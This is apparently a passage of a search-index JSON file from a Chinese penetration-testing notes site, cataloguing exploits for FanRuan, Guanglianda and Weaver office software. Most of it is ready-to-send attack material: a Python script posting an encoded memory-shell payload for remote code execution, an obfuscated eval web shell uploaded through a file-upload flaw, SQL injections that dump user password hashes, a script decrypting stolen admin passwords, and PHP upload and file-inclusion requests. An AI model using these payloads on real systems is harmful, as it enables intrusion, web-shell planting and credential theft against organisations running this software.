/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml cipher = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' #\u5bc6\u6587 PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #\u63a9\u7801 Password = \"\" cipher = cipher[3:] #\u622a\u65ad\u4e09\u4f4d\u540e for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) print (Password) \u7528\u5982\u4e0a\u811a\u672c\u89e3\u5bc6\u5f97\u5230\u5bc6\u7801","title":"\u5e06\u8f6f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B8%86%E8%BD%AF/%E5%B8%86%E8%BD%AF/#_1","text":"","title":"\u5e06\u8f6f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B8%86%E8%BD%AF/%E5%B8%86%E8%BD%AF/#_2","text":"\u67e5\u770b\u7248\u672c channel \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e v9 \u6587\u4ef6\u4e0a\u4f20 V8 get_geo_json \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B8%86%E8%BD%AF/%E5%B8%86%E8%BD%AF/#_3","text":"/decision/system/info","title":"\u67e5\u770b\u7248\u672c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B8%86%E8%BD%AF/%E5%B8%86%E8%BD%AF/#channel","text":"python\u811a\u672c\uff0c\u5199\u5185\u5b58\u9a6c import base64 import requests payload = b\"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\" b64_payload = base64.b64decode(payload) # proxies = {'http': 'http://localhost:8899', 'https': 'http://localhost:8899'} header = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*' } post_payload = b64_payload res = requests.post(\"http://aaa.com/webroot/decision/;/remote/design/channel\",data = post_payload,headers=header,verify=False) print(res.status_code) # with open(\"result.txt\", \"a\") as o: # o.write(res.text) print(res.text) http://a.com/webroot/faviconjs.css?filename=1&cmd=whoami","title":"channel \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B8%86%E8%BD%AF/%E5%B8%86%E8%BD%AF/#v9","text":"POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1 Host: 192.168.10.1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE Connection: close Content-Type:text/xml;charset=UTF-8 Content-Length: 74 {\"__CONTENT__\":\"<%out.println(\\\"Hello World!\\\");%>\",\"__CHARSET__\":\"UTF-8\"}","title":"v9 \u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B8%86%E8%BD%AF/%E5%B8%86%E8%BD%AF/#v8-get_geo_json","text":"\u8bfb\u5bc6\u7801 /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml cipher = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' #\u5bc6\u6587 PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #\u63a9\u7801 Password = \"\" cipher = cipher[3:] #\u622a\u65ad\u4e09\u4f4d\u540e for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) print (Password) \u7528\u5982\u4e0a\u811a\u672c\u89e3\u5bc6\u5f97\u5230\u5bc6\u7801","title":"V8 get_geo_json \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/","text":"\u5e7f\u8054\u8fbe \u76ee\u5f55 \u5e7f\u8054\u8fbeoa\u7528\u6237\u8868 \u5e7f\u8054\u8fbeoa sql\u6ce8\u5165\u6f0f\u6d1e POC \u5e7f\u8054\u8fbeoa \u540e\u53f0\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC \u5e7f\u8054\u8fbeoa sql\u6ce8\u5165\u6f0f\u6d1e POC \u5e7f\u8054\u8fbe Linkworks GetIMDictionarySQL \u6ce8\u5165\u6f0f\u6d1e \u5e7f\u8054\u8fbeoa\u7528\u6237\u8868 T_ORG_USER \u2192 F_CODE \uff0cF_PWD_MD5 \u5e7f\u8054\u8fbeoa sql\u6ce8\u5165\u6f0f\u6d1e POC POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 Host: [xxx.com](http://xxx.com) Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: [http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx](http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx) Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 88 dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER -- \u5e7f\u8054\u8fbeoa \u540e\u53f0\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1 Host: 10.10.10.1:8888 X-Requested-With: Ext.basex Accept: text/html, application/xhtml+xml, image/jxr, */* Accept-Language: zh-Hans-CN,zh-Hans;q=0.5 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj Accept: */* Origin: http://10.10.10.1 Referer: Cookie: Connection: close Content-Length: 421 ------WebKitFormBoundaryFfJZ4PlAZBixjELj Content-Disposition: form-data; filename=\"1.aspx\";filename=\"1.jpg\" Content-Type: application/text <%@ Page Language=\"Jscript\" Debug=true%> <% var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD'; var GFMA=Request.Form(\"qmq1\"); var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1); eval(GFMA, ONOQ); %> ------WebKitFormBoundaryFfJZ4PlAZBixjELj-- \u5e7f\u8054\u8fbeoa sql\u6ce8\u5165\u6f0f\u6d1e POC POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 Host: [xxx.com](http://xxx.com) Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: [http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx](http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx) Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 88 dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER -- \u5e7f\u8054\u8fbe Linkworks GetIMDictionarySQL \u6ce8\u5165\u6f0f\u6d1e POC: POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --","title":"\u5e7f\u8054\u8fbe"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/#_1","text":"","title":"\u5e7f\u8054\u8fbe"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/#_2","text":"\u5e7f\u8054\u8fbeoa\u7528\u6237\u8868 \u5e7f\u8054\u8fbeoa sql\u6ce8\u5165\u6f0f\u6d1e POC \u5e7f\u8054\u8fbeoa \u540e\u53f0\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC \u5e7f\u8054\u8fbeoa sql\u6ce8\u5165\u6f0f\u6d1e POC \u5e7f\u8054\u8fbe Linkworks GetIMDictionarySQL \u6ce8\u5165\u6f0f\u6d1e","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/#oa","text":"T_ORG_USER \u2192 F_CODE \uff0cF_PWD_MD5","title":"\u5e7f\u8054\u8fbeoa\u7528\u6237\u8868"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/#oa-sql-poc","text":"POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 Host: [xxx.com](http://xxx.com) Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: [http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx](http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx) Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 88 dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --","title":"\u5e7f\u8054\u8fbeoa sql\u6ce8\u5165\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/#oa-poc","text":"POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1 Host: 10.10.10.1:8888 X-Requested-With: Ext.basex Accept: text/html, application/xhtml+xml, image/jxr, */* Accept-Language: zh-Hans-CN,zh-Hans;q=0.5 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj Accept: */* Origin: http://10.10.10.1 Referer: Cookie: Connection: close Content-Length: 421 ------WebKitFormBoundaryFfJZ4PlAZBixjELj Content-Disposition: form-data; filename=\"1.aspx\";filename=\"1.jpg\" Content-Type: application/text <%@ Page Language=\"Jscript\" Debug=true%> <% var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD'; var GFMA=Request.Form(\"qmq1\"); var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1); eval(GFMA, ONOQ); %> ------WebKitFormBoundaryFfJZ4PlAZBixjELj--","title":"\u5e7f\u8054\u8fbeoa \u540e\u53f0\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/#oa-sql-poc_1","text":"POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 Host: [xxx.com](http://xxx.com) Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: [http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx](http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx) Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 88 dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --","title":"\u5e7f\u8054\u8fbeoa sql\u6ce8\u5165\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E5%B9%BF%E8%81%94%E8%BE%BE/%E5%B9%BF%E8%81%94%E8%BE%BE/#linkworks-getimdictionarysql","text":"POC: POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --","title":"\u5e7f\u8054\u8fbe Linkworks GetIMDictionarySQL \u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE/","text":"\u6cdb\u5fae \u76ee\u5f55 e-office9 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u6cdb\u5fae Weaver E-Office9 \u524d\u53f0\u6587\u4ef6\u5305\u542b POC \u6cdb\u5faeE-Office9\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e CVE-2023-2523 POC E-Cology \u67d0\u7248\u672c SQL\u6ce8\u5165\u6f0f\u6d1e POC \u6cdb\u5fae ShowDocsImagesql\u6ce8\u5165\u6f0f\u6d1e \u6cdb\u5fae Weaver E-Office9 \u524d\u53f0\u6587\u4ef6\u5305\u542b \u6cdb\u5faeecology\uff08\u4e5f\u79f0\u4e3a\u6cdb\u5fae\u534f\u540c\u529e\u516c\u5e73\u53f0\uff09\u662f\u4e00\u79cd\u4f01\u4e1a\u7ea7\u534f\u540c\u529e\u516c\u8f6f\u4ef6\uff0c\u65e8\u5728\u63d0\u9ad8\u4f01\u4e1a\u5185\u90e8\u534f\u4f5c\u548c\u6c9f\u901a\u6548\u7387\u3002\u5b83\u63d0\u4f9b\u4e86\u5404\u79cd\u529f\u80fd\uff0c\u5982\u4efb\u52a1\u7ba1\u7406\u3001\u6587\u6863\u5171\u4eab\u3001\u5de5\u4f5c\u6d41\u7a0b\u7ba1\u7406\u7b49\uff0c\u53ef\u4ee5\u5e2e\u52a9\u4f01\u4e1a\u5b9e\u73b0\u4fe1\u606f\u5171\u4eab\u548c\u534f\u540c\u529e\u516c\u3002 emobile\u662f\u6cdb\u5fae\u516c\u53f8\u5f00\u53d1\u7684\u4e00\u6b3e\u79fb\u52a8\u529e\u516c\u5e94\u7528\uff0c\u65e8\u5728\u8ba9\u7528\u6237\u80fd\u591f\u968f\u65f6\u968f\u5730\u901a\u8fc7\u79fb\u52a8\u8bbe\u5907\u8bbf\u95ee\u548c\u5904\u7406\u4f01\u4e1a\u6570\u636e\u548c\u4efb\u52a1\u3002emobile\u63d0\u4f9b\u4e86\u79fb\u52a8\u7aef\u7684\u534f\u540c\u529e\u516c\u529f\u80fd\uff0c\u5982\u67e5\u770b\u548c\u7f16\u8f91\u6587\u6863\u3001\u5904\u7406\u4efb\u52a1\u3001\u67e5\u770b\u65e5\u7a0b\u5b89\u6392\u7b49\u3002 e-office \u4e2d\u5c0f\u578b\u4f01\u4e1aoa e-office9 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 Weaver E-Office9\u7248\u672c\u5b58\u5728\u4ee3\u7801\u95ee\u9898\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u6587\u4ef6/inc/jquery/uploadify/uploadify.php\u5b58\u5728\u95ee\u9898\uff0c\u5bf9\u53c2\u6570Filedata\u7684\u64cd\u4f5c\u4f1a\u5bfc\u81f4\u4e0d\u53d7\u9650\u5236\u7684\u4e0a\u4f20\u3002 Weaver E-Office9.0 POC or EXP POST /inc/jquery/uploadify/uploadify.php HTTP/1.1 Host: 192.168.232.137:8082 User-Agent: test Connection: close Content-Length: 493 Accept-Encoding: gzip Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85 --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85 Content-Disposition: form-data; name=\"Filedata\"; filename=\"666.php\" Content-Type: application/octet-stream <?php phpinfo();?> --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85-- --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85 Content-Disposition: form-data; name=\"file\"; filename=\"\" Content-Type: application/octet-stream --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85-- \u6cdb\u5fae Weaver E-Office9 \u524d\u53f0\u6587\u4ef6\u5305\u542b POC http://URL/E-mobile/App/Init.php?weiApi=1\\&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin\\&m=12344554_../../attachment/xxx.xls \u6cdb\u5faeE-Office9\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e CVE-2023-2523 POC POST/Emobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1 Host:192.168.233.10:8082 Cache-Control:max-age=0 Upgrade-Insecure-Requests:1 Origin:null Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt Accept-Encoding:gzip, deflate Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7 Connection:close ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt Content-Disposition:form-data; name=\"upload_quwan\"; filename=\"1.php.\" Content-Type:image/jpeg <?phpphpinfo();?> ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt E-Cology \u67d0\u7248\u672c SQL\u6ce8\u5165\u6f0f\u6d1e POC POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36 Connection: close Content-Length: 189 Content-Type: text/plain Accept-Encoding: gzip callCount=1 page= httpSessionId= scriptSessionId= c0-scriptName=DocDwrUtil c0-methodName=ifNewsCheckOutByCurrentUser c0-id=0 c0-param0=string:1 AND 1=1 c0-param1=string:1 batchId=0 \u6cdb\u5fae ShowDocsImagesql\u6ce8\u5165\u6f0f\u6d1e GET /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=* HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) 5bGx5rW35LmL5YWz Accept-Encoding: gzip, deflate Connection: close \u6cdb\u5fae Weaver E-Office9 \u524d\u53f0\u6587\u4ef6\u5305\u542b http://URL/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls","title":"\u6cdb\u5fae"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE/#_1","text":"","title":"\u6cdb\u5fae"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE/#_2","text":"e-office9 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u6cdb\u5fae Weaver E-Office9 \u524d\u53f0\u6587\u4ef6\u5305\u542b POC \u6cdb\u5faeE-Office9\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e CVE-2023-2523 POC E-Cology \u67d0\u7248\u672c SQL\u6ce8\u5165\u6f0f\u6d1e POC \u6cdb\u5fae ShowDocsImagesql\u6ce8\u5165\u6f0f\u6d1e \u6cdb\u5fae Weaver E-Office9 \u524d\u53f0\u6587\u4ef6\u5305\u542b \u6cdb\u5faeecology\uff08\u4e5f\u79f0\u4e3a\u6cdb\u5fae\u534f\u540c\u529e\u516c\u5e73\u53f0\uff09\u662f\u4e00\u79cd\u4f01\u4e1a\u7ea7\u534f\u540c\u529e\u516c\u8f6f\u4ef6\uff0c\u65e8\u5728\u63d0\u9ad8\u4f01\u4e1a\u5185\u90e8\u534f\u4f5c\u548c\u6c9f\u901a\u6548\u7387\u3002\u5b83\u63d0\u4f9b\u4e86\u5404\u79cd\u529f\u80fd\uff0c\u5982\u4efb\u52a1\u7ba1\u7406\u3001\u6587\u6863\u5171\u4eab\u3001\u5de5\u4f5c\u6d41\u7a0b\u7ba1\u7406\u7b49\uff0c\u53ef\u4ee5\u5e2e\u52a9\u4f01\u4e1a\u5b9e\u73b0\u4fe1\u606f\u5171\u4eab\u548c\u534f\u540c\u529e\u516c\u3002 emobile\u662f\u6cdb\u5fae\u516c\u53f8\u5f00\u53d1\u7684\u4e00\u6b3e\u79fb\u52a8\u529e\u516c\u5e94\u7528\uff0c\u65e8\u5728\u8ba9\u7528\u6237\u80fd\u591f\u968f\u65f6\u968f\u5730\u901a\u8fc7\u79fb\u52a8\u8bbe\u5907\u8bbf\u95ee\u548c\u5904\u7406\u4f01\u4e1a\u6570\u636e\u548c\u4efb\u52a1\u3002emobile\u63d0\u4f9b\u4e86\u79fb\u52a8\u7aef\u7684\u534f\u540c\u529e\u516c\u529f\u80fd\uff0c\u5982\u67e5\u770b\u548c\u7f16\u8f91\u6587\u6863\u3001\u5904\u7406\u4efb\u52a1\u3001\u67e5\u770b\u65e5\u7a0b\u5b89\u6392\u7b49\u3002 e-office 